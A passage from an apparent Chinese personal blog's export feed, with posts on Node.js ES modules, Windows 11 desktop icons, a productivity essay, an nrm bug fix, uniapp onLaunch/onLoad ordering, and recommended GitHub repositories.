<h3 id="（4）在-Node-js-使用"><a href="#（4）在-Node-js-使用" class="headerlink" title="（4）在 Node.js 使用"></a>（4）在 Node.js 使用</h3><p>上面提到，Node.js 使用的是 CommonJS 模块规范，它也是支持 ES 模块的。在 Node.js 13 之前，ES 模块是一项实验性技术，因此，可以通过使用 <code>.mjs</code> 扩展名保存模块并通过标志访问它来使用模块。</p>
<p>从 Node.js 13 开始，可以通过以下两种方式使用模块:</p>
<ul>
<li>使用 <code>.mjs</code> 扩展名保存模块；</li>
<li>在最近的文件夹中创建一个 <code>type=&quot;module&quot;</code> 的 <code>package.json</code> 文件。</li>
</ul>
<p>那如何在小于等于 12 版本的 Node.js 中使用 ES 模块呢？可以在执行脚本启动时加上 <code>--experimental-modules</code>，不过这一用法要求相应的文件后缀名必须为 <code>.mjs</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">node --experimental-modules module1.mjs</span><br><span class="line">import module1 from <span class="string">&#x27;./module1.mjs&#x27;</span></span><br><span class="line">module1</span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://v8.dev/features/modules">V8 JavaScript modules</a></p>
<p>[2] <a href="https://blog.logrocket.com/javascript-reference-guide-js-modules/">JavaScript Reference Guide: JS module ecosystem</a></p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>模块化</tag>
      </tags>
  </entry>
  <entry>
    <title>win11更新后桌面多了六个图标？</title>
    <url>/2022/12/18/20221218-win11%E6%9B%B4%E6%96%B0%E5%90%8E%E6%A1%8C%E9%9D%A2%E5%A4%9A%E4%BA%86%E5%85%AD%E4%B8%AA%E5%9B%BE%E6%A0%87%EF%BC%9F/</url>
    <content><![CDATA[<p>win11 更新后，桌面多了音乐、图片、下载、文档、视频、桌面，这六个图标怎么删除?</p>
<span id="more"></span>

<p>这六个图标文件夹应该是和桌面文件夹同级的，不应该在桌面里面。要修改很容易，不要直接在桌面上删除，当然也删除不了。</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>出现这 6 个图标，一般是本地装了桌面整理一类的软件，如腾讯桌面整理助手、360 桌面整理助手等，会复现该问题。</p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>卸载该桌面整理助手，重装就好了。</p>
<p>个人不推荐从注册表<code>explorer\desktop\namespace</code>里删除。</p>
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>win11</tag>
      </tags>
  </entry>
  <entry>
    <title>废掉一个人最快的方式：鼓励他一直勤奋</title>
    <url>/2022/12/18/20221218-%E5%BA%9F%E6%8E%89%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%9C%80%E5%BF%AB%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%9A%E9%BC%93%E5%8A%B1%E4%BB%96%E4%B8%80%E7%9B%B4%E5%8B%A4%E5%A5%8B/</url>
    <content><![CDATA[<p>前两天深夜，朋友给我发了一条消息，说他被辞退了。</p>
<p>在收到邮件的那一刻，他几近崩溃：</p>
<p>“为什么是我？”</p>
<p>“我天天加班到深夜，凭什么辞掉我？”</p>
<p>他带着愤怒和不爽冲进领导办公室，准备拍桌子对质。</p>
<p>领导只问了一句：</p>
<p>“经常加没错，那你的业绩呢？”</p>
<p>他哑口无言，离开了办公室，然后收拾东西走人。</p>
<p>生活中像朋友一样的人很多，假装很忙，假装加班到深夜，假装自己都被自己的付出感动。</p>
<p><strong>但现实很残酷，没有成果的忙，都是假忙！</strong></p>
<p>一位在世界 500 强公司工作了十年的 HR 表示：</p>
<p>企业裁人不看年龄层，往往是那种看起来很忙，却没有生产力的人，他们严重影响公司效率。</p>
<p>看过一句话：</p>
<p>“如果你看起来不忙，你就没有生产力。”</p>
<p>事实上，很多人看起来忙，依旧没有生产力。</p>
<p><img src="https://cdn.huatree.top/image-20221218130209295.jpg" alt="image-20221218130209295"></p>
<span id="more"></span>

<div class="note info"><p>文章转载易简读书（ID：yijiandushu） | 小狼女</p>
</div>

<h2 id="不懂拒绝，假装勤奋"><a href="#不懂拒绝，假装勤奋" class="headerlink" title="不懂拒绝，假装勤奋"></a>不懂拒绝，假装勤奋</h2><p>网上看到一个故事。</p>
<p>他是广告公司的管理层。</p>
<p>最近，公司要策划节日活动，大家各抒己见，他吩咐下属执行。</p>
<p>实操时，下属发现很难做下去，又不敢违抗，纠结了两天，硬着头皮做下去。</p>
<p>天天加班到凌晨 3 点，策划书拖了一周还是没成品。</p>
<p><strong>他问了半天，那孩子才说出自己的想法，策划书做不下去，超出了能力范围。</strong></p>
<p>他听了就来气：</p>
<p>“有问题为什么不提前沟通？</p>
<p>拖了这么久，我不问你，你打算拖到什么时候？</p>
<p>我要的是结果，如果你不主动不拒绝，你整天在我面前装忙有意思吗？”</p>
<p>当领导的都有两把刷子，你在假忙还是有效率的忙，怎么会看不出来？</p>
<p>时间是世界赋予我们最公平的资源，注意力是我们能调控的唯一资源。</p>
<p>那个下属却把这两种资源都放在了最没意义的心理活动——纠结。</p>
<p>不懂拒绝，陷入纠结，就是假忙。</p>
<p>电视剧《命中注定我爱你》，女主陈欣怡，长相普通，名字大众。</p>
<p>同事们看她好欺负，就把干不完的事儿都写在便利贴上，往她额头贴。</p>
<p><strong>出了问题，老板理所当然找她。</strong></p>
<p>这部剧带火了一个词——便利贴女孩。</p>
<p>便利贴被撕下来的下一步，就是被抛弃。</p>
<p>没有持续的价值，因为它是方便别人而存在的。</p>
<p>便利贴女孩，就是为别人忙活，把自己最宝贵的资源耗在别人身上了。</p>
<p>她们是假好人，心理学上称作“讨好型人格”。</p>
<p>假好人的假忙最扎心，他在无限浪费自己的时间。</p>
<h2 id="不懂凡事提前，只会习惯提前"><a href="#不懂凡事提前，只会习惯提前" class="headerlink" title="不懂凡事提前，只会习惯提前"></a>不懂凡事提前，只会习惯提前</h2><p>莉莉要完成月度财务分析报告，明天下午 4 点就得交。</p>
<p>回到公司，10 点坐下写报告，突然想起有个消息没回。</p>
<p>对方正好在线，她就聊了 20 分钟。</p>
<p>然后，她又顺便点开看看热搜，和办公室的人一起聊起了八卦。</p>
<p>聊久了哪有心思写，马上就到午饭时间了，下午再写吧。</p>
<p>再刷刷别的，早上 2 小时过去了……</p>
<p><strong>午饭吃完了，刷会儿剧，困了当然得小睡，才有精神写报告。</strong></p>
<p>下午打开电脑，看会新闻，3 点开始写，写了没两句话，手又拿起了手机。</p>
<p>下午茶时间，点杯咖啡，来个奶茶吧……</p>
<p>5 点多，人的精力最不好了，效率很低，写到 7 点多，也没写到 2 页。</p>
<p>回到家后，挤地铁挤得累，压根不想打开电脑，明天早点起床再写吧，先刷会儿手机……</p>
<p>第二天，一觉就睡到早上 8 点，匆匆起床，挤地铁上班，根本没时间写。</p>
<p>早上有个会，还有别的事情要忙，结果她午饭也没吃，赶紧写报告。</p>
<p>但也赶不上下午 4 点的截止时间了，只好向老板申请延期。</p>
<p>老板无奈同意，她晚上 8 点终于赶完了，内心愤怒不已，发誓下次一定不这样。</p>
<p><strong>莉莉，不是别人，是你我拖延的缩影。</strong></p>
<p>人遵循最小阻力原则，都喜欢做那些小阻力的事情。</p>
<p>刷微信就很容易，但写报告很费脑，往往不愿意马上行动，就造成了拖延。</p>
<h2 id="有个-TED-演讲听得我热泪盈眶"><a href="#有个-TED-演讲听得我热泪盈眶" class="headerlink" title="有个 TED 演讲听得我热泪盈眶"></a>有个 TED 演讲听得我热泪盈眶</h2><p>演讲者大学时候是个拖延症患者，每篇论文都是压哨完成。</p>
<p>在准备 90 页毕业论文时，他做了个详细的年计划。</p>
<p>结果年计划变成了半年计划，再变成了月计划，周计划，</p>
<p><strong>最后突然发现，离交论文只有 3 天了。</strong></p>
<p>别无他法，他只得在剩下的 72 小时里，连续通宵两个晚上完成论文。</p>
<p>在截止交稿的最后一刻，完成了任务。</p>
<p>在那 72 小时里，他忙着赶论文；</p>
<p>而在 72 小时前，他估计也很忙，忙着各种各样的心理活动，忙着玩，忙着干些有的没的。</p>
<p>演讲者非常幽默，说后来找了个非拖延的人，与自己一起进了核磁共振室做脑部扫描，发现两人脑子不一样。</p>
<p><img src="https://cdn.huatree.top/image-20221218130335702.jpg" alt="image-20221218130335702"></p>
<center>非拖延者的脑子</center>

<p><img src="https://cdn.huatree.top/image-20221218130411653.jpg" alt="image-20221218130411653"></p>
<center>拖延者的脑子</center>

<p>两个脑子里，都有一个理性决策者的角色，但拖延症患者的脑子里，多了只及时行乐的猴子。</p>
<p>理性决策者说，我们要开始写报告啦。</p>
<p>猴子就会告诉你，来，先刷个短视频，不着急。</p>
<p>这只猴子活在当下，没有过去的记忆和未来的概念，它只关注两件事：</p>
<p>简单和开心。</p>
<p><strong>它告诉你，理性决策者说的都对，但及时行乐更舒服。</strong></p>
<p>一只狗可以只关注简单和开心，回到过去当个原始人也可以只顾着及时行乐，但你活在一个飞速发展的现代文明时代。</p>
<p>如果你总是让这只猴子掌控人生方向盘，你人生大块的时间就会耗费在及时行乐。</p>
<p>剩下的时间匆忙完成任务，却毫无成长。</p>
<p>假忙族最可怕的是，你过着一种又累又低效率人生。</p>
<h2 id="你被碎片化的“假忙“欺骗了多久？"><a href="#你被碎片化的“假忙“欺骗了多久？" class="headerlink" title="你被碎片化的“假忙“欺骗了多久？"></a>你被碎片化的“假忙“欺骗了多久？</h2><p>有家互联网公司转型期间，改成了弹性工作制，每天工作 8 小时即可。</p>
<p>工作制后，A 组和 B 组程序员在不同的领导者下，呈现不同的工作状态。</p>
<p>A 组领导者 10 点半才到公司，看看前一天的邮件，跟人讨论下问题就到午饭时间了，整个上午很难集中精力写代码。</p>
<p>午休时间不午睡，不是在玩手机就是在看网页。</p>
<p>下午昏昏欲睡，谁找他都不会拒绝，没写几行代码就去看看邮件或者玩玩手机。</p>
<p><strong>白天工作输出少，但晚上人少，他才集中精力写代码。</strong></p>
<p>回去得晚，早上又起不来，第二天到公司就差不多中午，如此循环。</p>
<p>组员在这样的影响下，经常加班。</p>
<p>B 组领导者每天 9 点左右就到公司。</p>
<p>上午集中精力编代码，期间只会上厕所和喝水。</p>
<p>为了减轻打扰，他基本会关掉邮件提醒和微信，会将手机调成静音，进入一个小会议室工作。</p>
<p>他的组员也不会在早上讨论问题，而是集中时间编码，晚上基本不加班。</p>
<p>科技将时间和空间碎片化，刷个牙的时间想看个视频，写个文案之余又想聊个天。</p>
<p><strong>说白了就是精力分散，难以专注，忙了半天并没收获。</strong></p>
<p>大脑中有种物质叫做髓磷脂，负责神经元之间的链接。</p>
<p>髓磷脂缺乏到一定程度，大脑就会产生病变。</p>
<p>你过的越碎片，髓磷脂急速下降，你就不知不觉陷入了假忙状态。</p>
<h2 id="情绪不稳，假忙陷入死循环"><a href="#情绪不稳，假忙陷入死循环" class="headerlink" title="情绪不稳，假忙陷入死循环"></a>情绪不稳，假忙陷入死循环</h2><p>精力难以集中恐怕是信息时代的通病，病久了，特别影响情绪。</p>
<p>前些日子天气不好，交通堵塞，大早上回到公司很丧。</p>
<p>工作上又突然多了些烦杂事务，节奏被完全打破，整个人混混沌沌的。</p>
<p>晚上加班后，和朋友去吃了顿火锅，走的时候天气突然降温，大雨又下了起来，只得打车。</p>
<p><strong>结果车找不到我，我找不到车，车取消了订单，手机也没电了。</strong></p>
<p>我回到火锅店想借条充电线，但那里只有街电宝。</p>
<p>问了下店员有没有充电线，她回我句不好意思。</p>
<p>正常情况下，我会来场高情商沟通，80%都能获得帮助。</p>
<p>但那次没有，我有点不满意，跑去问了第二家，第三家……</p>
<p>6 层楼，没有一家有充电线。</p>
<p>我怒上心头，坐在角落里冷静了好久，最后才向一家蛋糕店寻求帮助。</p>
<p>我当然知道店里没义务准备充电线，但根本控制不了情绪。</p>
<p>第二天早上，工作效率巨低。</p>
<p>下午来了个沙龙，去参加后还挺开心的。</p>
<p>但到了晚上，没干完的活又得加班干，烦的要命。</p>
<p><strong>这种波动的情绪，影响了我一周。</strong></p>
<p>其实，别人工作时你瞎想，别人下班时你又加班，恶性循环。</p>
<p>人的一生，就是背负越来越沉重的担子前行。</p>
<p>你要是不懂控制自己的情绪，只能没效率假忙，一辈子没完没了。</p>
<h2 id="为什么越来越多的人假忙？"><a href="#为什么越来越多的人假忙？" class="headerlink" title="为什么越来越多的人假忙？"></a>为什么越来越多的人假忙？</h2><p>不可否定，环境所趋，分神的事情多，90%的人都需要处理繁琐事务。</p>
<p>科技发展的快，刷视频，刷表情包，朋友圈求赞，时间黑洞也越来越多。</p>
<p>但也没必要哀叹从前慢现在乱，时代和河流往前奔涌，叹也回不到过去。</p>
<p><strong>能在时代中冲出来的人，都懂控制。</strong></p>
<p>你想挣扎出来，就要学会自控。</p>
<p><strong>1. 终结拖延症</strong></p>
<p>⦁ 撕掉“拖延症”标签</p>
<p>说自己有拖延症的人，很多时候是为自己的错误找说法。</p>
<p>随意评价自己对解决问题毫无益处，请先撕标签。</p>
<p>⦁ 每天只做 6 件事</p>
<p>拿张白纸，每天写下你要做的 6 件重要的事，人生已经非常高效了。</p>
<p><strong>2. 深度工作</strong></p>
<p>《深度工作》一书中提出，新经济中，3 类人最贵。</p>
<p>一是能和机器对话的人，技术人员；</p>
<p>二是行业明星，也就是有 IP、个人品牌的人；</p>
<p>三是资本家，有钱投资高新技术。</p>
<p><strong>贵就贵在，这类人能在新经济中创造巨大的价值。</strong></p>
<p>能创造价值的工作，叫做深度工作，对认知要求极高，不易复制；</p>
<p>相反那些容易复制又不能创造价值的工作，叫做浮浅工作。</p>
<p>分享两个有趣的策略：</p>
<p>⦁ 大手笔</p>
<p>J.k.罗琳成名后太多事务，一直没法完成哈利·波特系列最后一部《死亡圣器》。</p>
<p>后来他花钱到五星级酒店写，一晚上好几千块呢，他只能进行专注写作。</p>
<p>⦁ 拥抱无聊</p>
<p>现代人专注力特别差，因为没有无聊的时光。</p>
<p><strong>别整天碎片学习，无聊的时候，你拥抱它好了，你的脑子也需要休息。</strong></p>
<p>深度工作是碎片化时代的良药，你完全可以刻意练习。</p>
<p>促进髓磷脂分泌，提升专注力。</p>
<p><strong>3. 高能量姿势</strong></p>
<p>哈佛商学院教授、社会心理学家埃米·卡迪曾提出：</p>
<p>“用肢体语言塑造自己。”</p>
<p>情绪不好时，做下伸展动作；平时尝试练习瑜伽，练习呼吸。</p>
<p>身体改变心理。</p>
<hr>
<p>其实，要做到这些事儿挺难的。</p>
<p>一是因为这是个反熵增的过程。</p>
<p>任人宰割，无限拖延，精力分散，情绪随流，这些在物理上都叫做熵增（事物混乱度增加），假忙就是熵增。</p>
<p>但生命特征是个反熵增的过程，没有疼和难，也没有人。</p>
<p>你想变得有效率，就是要懂控制。</p>
<p>二是因为，活得真实本来就需要勇气。</p>
<p>如果你能自控，相信会有别番成长。</p>
<p><strong>要是你继续假忙，该错过的你都会错过，不该错过的你也会错过。</strong></p>
<hr>
<p><strong>有书君说</strong></p>
<p><strong>没有成果的忙，都是假忙</strong></p>
<p><strong>今天有书君向你推荐一个优质的阅读平台</strong></p>
<p><strong>轻读实验室</strong></p>
<p>每天一篇观察社会的深度文章</p>
<p>更有精彩的人物故事、涨知识的热门好书</p>
<p>关注后在对话框输入<strong>“书单”</strong></p>
<p><strong>免费领人生必读 200 本好书</strong></p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>学习</tag>
        <tag>工作</tag>
      </tags>
  </entry>
  <entry>
    <title>nrm列表查询那个*标识没有了？</title>
    <url>/2022/12/20/20221220-nrm%E5%88%97%E8%A1%A8%E6%9F%A5%E8%AF%A2%E9%82%A3%E4%B8%AA%E6%A0%87%E8%AF%86%E6%B2%A1%E6%9C%89%E4%BA%86%EF%BC%9F/</url>
    <content><![CDATA[<p>nrm ls 依然不带星或 nrm current 不显示当前？</p>
<span id="more"></span>

<h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>在最新版，1.2.5 依然没有解决这个问题。</p>
<p>从旧版本看 .nrmrc 文件中只会保存一条记录。</p>
<p>在 1.2.5 中 cli.js 文件的 211 行， 判断逻辑是有问题的。hasOwnProperty 判断不应从 customRegistries 中是否存在用户输入的 name 变量传递的值。[如：npm、taobao] ，判断应该从所有 allRegistries 的集合中判断是否存在输入 use 后面的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">hasOwnProperty</span>(allRegistries, name) &amp;&amp; (name <span class="keyword">in</span> registries || customRegistries[name].<span class="property">registry</span> === registry.<span class="property">registry</span>)) &#123;</span><br><span class="line">    <span class="comment">//if (!hasOwnProperty(customRegistries, name) &amp;&amp; (name in registries || customRegistries[name].registry === registry.registry)) &#123;</span></span><br><span class="line">    registry[<span class="variable constant_">FIELD_IS_CURRENT</span>] = <span class="literal">true</span></span><br><span class="line">    customRegistries[name] = registry</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>直接安装源码是 ok 的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm i Pana/nrm -g</span><br></pre></td></tr></table></figure>

<p>nrm 了解更多，<a href="https://www.npmjs.com/package/nrm">详见</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://github.com/Pana/nrm/issues/111">nrm ls 依然不带星或 nrm current 不显示当前？</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>uniapp中onLaunch异步方法与onLoad执行顺序问题</title>
    <url>/2022/12/20/20221220-uniapp%E4%B8%ADonLaunch%E5%BC%82%E6%AD%A5%E6%96%B9%E6%B3%95%E4%B8%8EonLoad%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>app.vue 里的 onLaunch 中如果有异步方法，比如登录方法，返回结果可能会在页面的 onLoad 之后，想让页面的 onLoad 在 onLaunch 之后执行。</p>
<span id="more"></span>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>场景：比如微信小程序在 onLaunch 中进行登录后取得 openid 并获得 token，项目各页面需要带上该 token 请求其他接口。</p>
<h3 id="vue2"><a href="#vue2" class="headerlink" title="vue2"></a>vue2</h3><p>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$onLaunched</span> = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$isResolve</span> = resolve</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>App.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">onLaunch</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">             * 可以setTimeout()模拟异步，观察执行顺序</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">             * ------</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">             */</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// #ifndef H5</span></span></span><br><span class="line"><span class="language-javascript">            uni.<span class="title function_">login</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="function">(<span class="params">loginRes</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// #ifdef MP-WEIXIN</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">login</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// 该接口为我们自己写的获取 openid/token 的接口，请替换成自己的</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">appId</span>: <span class="string">&#x27;wx1234567890&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">code</span>: loginRes.<span class="property">code</span></span></span><br><span class="line"><span class="language-javascript">                    &#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">console</span>.<span class="title function_">info</span>(res.<span class="property">object</span>.<span class="property">token</span>)</span></span><br><span class="line"><span class="language-javascript">                            uni.<span class="title function_">setStorageSync</span>(<span class="string">&#x27;mcToken&#x27;</span>, res.<span class="property">object</span>.<span class="property">token</span>)</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">this</span>.$isResolve()</span></span><br><span class="line"><span class="language-javascript">                        &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">console</span>.<span class="title function_">error</span>(e)</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;)</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// #endif</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// #endif</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面 onLoad</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="title function_">onLoad</span>(<span class="params">option</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 等待登录成功</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">$onLaunched</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 后续业务逻辑</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="vue3"><a href="#vue3" class="headerlink" title="vue3"></a>vue3</h3><p>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// #ifdef VUE3</span></span><br><span class="line"><span class="keyword">import</span> &#123; createSSRApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">createApp</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> app = <span class="title function_">createSSRApp</span>(<span class="title class_">App</span>)</span><br><span class="line">    app.<span class="property">config</span>.<span class="property">globalProperties</span>.<span class="property">$onLaunched</span> = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        app.<span class="property">config</span>.<span class="property">globalProperties</span>.<span class="property">$isResolve</span> = resolve</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        app</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// #endif</span></span><br></pre></td></tr></table></figure>

<p>App.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">onLaunch</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--App-onLaunch&#x27;</span>, <span class="variable language_">this</span>)</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.$isResolve()</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面 onLoad</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="title function_">onLoad</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">$onLaunched</span></span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--page-onLoad&#x27;</span>, <span class="variable language_">this</span>)</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://ask.dcloud.net.cn/article/39591">app.onLaunch 与 page.onLoad 异步问题终极解决方案</a></p>
<p>[2] <a href="https://cn.vuejs.org/api/application.html#app-config-globalproperties">vue 官网-app.config.globalProperties</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>uniapp</tag>
      </tags>
  </entry>
  <entry>
    <title>一些优秀的github库</title>
    <url>/2023/01/01/20230101-%E4%B8%80%E4%BA%9B%E4%BC%98%E7%A7%80%E7%9A%84github%E5%BA%93/</url>
    <content><![CDATA[<p>一个人的头脑很可怕，一堆人的头脑更骇人。这些仓库经过了岁月的沉淀，里面的内容可以说是汗牛充栋。</p>
<p><img src="https://cdn.huatree.top/image-20230101194438973.png" alt="image-20230101194438973"></p>
<span id="more"></span>

<h2 id="Awesome"><a href="#Awesome" class="headerlink" title="Awesome"></a>Awesome</h2><p><a href="https://github.com/sindresorhus/awesome">https://github.com/sindresorhus/awesome</a></p>
<p>首先我要推荐的当然是 awesome 系列。如果我对某项技术想要深入的研究，现在习惯性的会在 google 搜索 awesome 系列。比如 awesome-promethues，它永远不会让我失望。</p>
<p>awesome 仓库是所有 awesome 的集合，涵盖了包括学习、工作、研究领域的各类 awesome 项目介绍、工程实践、原理探讨、框架扩展等。</p>
<p>如果你的领导交给你一项新的技术的研究，来这里看看准没错。</p>
<h2 id="FreeCodeCamp"><a href="#FreeCodeCamp" class="headerlink" title="FreeCodeCamp"></a>FreeCodeCamp</h2><p><a href="https://github.com/freeCodeCamp/freeCodeCamp">https://github.com/freeCodeCamp/freeCodeCamp</a></p>
<p>freeCodeCamp 是一个在线编程平台，大多数是关于前端的，当然也有些 Python 方面的。</p>
<p>它的题目都非常短小，致力于采用你的闲暇时间来完成学习。里面的很多题目都是经过精心设计的、交互式的，肯定让你的印象深刻。</p>
<h2 id="developer-roadmap"><a href="#developer-roadmap" class="headerlink" title="developer-roadmap"></a>developer-roadmap</h2><p><a href="https://github.com/kamranahmedse/developer-roadmap">https://github.com/kamranahmedse/developer-roadmap</a></p>
<p>如果说现在的计算机知识点是那么分散的话，那么这个仓库的内容可真算的上是 roadmap 了。</p>
<p>针对于每一个技术工种，它都提供了一幅长长的，可以交互的图，让你对自己的计算机水平有一个大的把握，同时提供一些延伸的学习资料。</p>
<h2 id="Build-Your-Own-X"><a href="#Build-Your-Own-X" class="headerlink" title="Build Your Own X"></a>Build Your Own X</h2><p><a href="https://github.com/codecrafters-io/build-your-own-x">https://github.com/codecrafters-io/build-your-own-x</a></p>
<p>搞技术的都有一股探索精神，想要弄清楚框架或者技术背后的原理。</p>
<p>这个仓库集合了一些非常 hack 的技术，让你体验一把盘古开天辟地的感觉。比如从零构建一个数据库、操作系统、JVM 等。仓库的页面非常简陋，但它收集的内容却惊为天人。</p>
<p>如果你对一些基础的计算机原理比较感兴趣，这是不可多得的开胃餐。</p>
<h2 id="System-Design-Primer"><a href="#System-Design-Primer" class="headerlink" title="System Design Primer"></a>System Design Primer</h2><p><a href="https://github.com/donnemartin/system-design-primer">https://github.com/donnemartin/system-design-primer</a></p>
<p>设计可扩展的高并发系统，原是架构师的专利。不过随着要求不断提升，普通开发人员也有了要求。</p>
